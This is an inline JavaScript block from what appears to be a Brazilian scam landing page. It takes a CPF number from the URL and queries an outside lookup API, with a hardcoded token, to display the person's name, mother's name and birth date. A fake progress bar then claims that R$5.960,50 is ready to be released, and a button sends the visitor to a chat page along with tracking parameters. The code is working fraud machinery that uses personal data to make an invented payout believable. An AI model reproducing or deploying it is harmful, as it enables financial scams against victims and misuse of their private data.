    <script>
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        const cpf = getQueryParam('cpf');
        
        // Preencher os parâmetros UTM
        const utm_source = getQueryParam('utm_source');
        const utm_medium = getQueryParam('utm_medium');
        const utm_campaign = getQueryParam('utm_campaign');
        const utm_id = getQueryParam('utm_id');
        const utm_term = getQueryParam('utm_term');
        const utm_content = getQueryParam('utm_content');
        const src = getQueryParam('src');

    
        const apiUrl = `https://app.metadisparo.pro/consultar-filtrada/cpf?cpf=${cpf}&token=pbo2z4mxudd1946zqvvr9rj`;

        const progressBar = document.getElementById('progressBar');
        const progress = progressBar.firstElementChild;
        const resultDiv = document.getElementById('result');
        const progressText = document.getElementById('progressText');
        const receberBtn = document.getElementById('receberBtn');
        const calculandoValor = document.getElementById('calculandoValor');

        progress.style.width = '0';
        progressBar.style.display = 'block';
        resultDiv.style.opacity = '1';


        // Fetch CPF data immediately and display it
        fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
                console.log(data)
				resultDiv.style.display = 'block';
				if (data && data.NOME) {
                    document.querySelector('#resultadoNome span').textContent = data.NOME;
                    document.querySelector('#resultadoCPF span').textContent = data.CPF;
                    
                    // Atualiza e formata o nome da mãe
            if (data.NOME_MAE) {
                document.querySelector('#resultadoMae span').textContent = data.NOME_MAE;
            } else {
                document.querySelector('#resultadoMae span').textContent = "Nome da mãe não disponível";
            }
                    document.querySelector('#resultadoNascimento span').textContent = data.DT_NASCIMENTO;


                } else {
                    document.getElementById('result').innerText = 'CPF não encontrado';
                }
            })
            .catch(error => {
                console.error('Erro:', error);
                document.getElementById('result').innerText = 'Erro ao buscar o CPF';
				resultDiv.style.display = 'block';
			});


        let width = 0;
        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                progressBar.style.display = 'none';

                calculandoValor.innerHTML = '<img decoding="async" src="images/05.png" class="icon" alt="Dinheiro Icone"> R$5.960,50 pronto para ser liberado';
                receberBtn.style.display = 'block';
            } else {
                width += 100 / 20; // Incremento para 54 segundos
                progress.style.width = width + '%';

                if (width >= 100) {
                    resultDiv.style.opacity = '1';
                }
            }
        }, 1000);

        // Redirecionar o botão para a URL especificada
        receberBtn.addEventListener('click', function() {
            const url = `/type/chat/index.html?cpf=${cpf}&utm_source=${utm_source}&utm_medium=${utm_medium}&utm_campaign=${utm_campaign}&utm_id=${utm_id}&utm_term=${utm_term}&utm_content=${utm_content}&src=${src}`;
            window.location.href = url;
        });
    </script>
